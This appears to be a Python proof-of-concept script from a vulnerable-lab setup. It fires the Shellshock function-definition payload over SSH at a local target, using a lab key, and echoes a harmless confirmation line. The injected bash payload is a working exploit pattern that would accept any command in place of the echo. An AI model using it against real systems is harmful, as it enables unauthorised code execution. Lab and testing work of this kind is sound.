#!/usr/bin/env python3

from argparse import ArgumentParser
import sys
import os


def stamp(message):
    print(f'[ ] {message}')


def stamp_ok(message):
    print(f'[+] {message}')


def stamp_command(command):
    print()
    print(f'$ {command}')
    os.system(command)
    print()


def parse_args():
    parser = ArgumentParser()
    parser.add_argument('--target', help='Target in format host:port',
                        default='127.0.0.1:3002')
    return parser.parse_args(sys.argv[1:])


def main():
    args = parse_args()
    stamp('Changing directory to current directory of the script.')
    os.chdir(os.path.dirname(os.path.realpath(__file__)))
    stamp('Trying to exploit target.')
    host, port = args.target.split(':')
    command = \
        f'ssh -i ../environments/shellshock/ssh_key -p {port} simple_user@{host} ' + \
        '"() { :;}; echo This exploit worked"'
    stamp_command(command)
    stamp_ok('If everything is ok, you should see `This exploit worked` above')
    stamp_ok('Not as an environment variable, but on its separate line.')


if __name__ == "__main__":
    main()
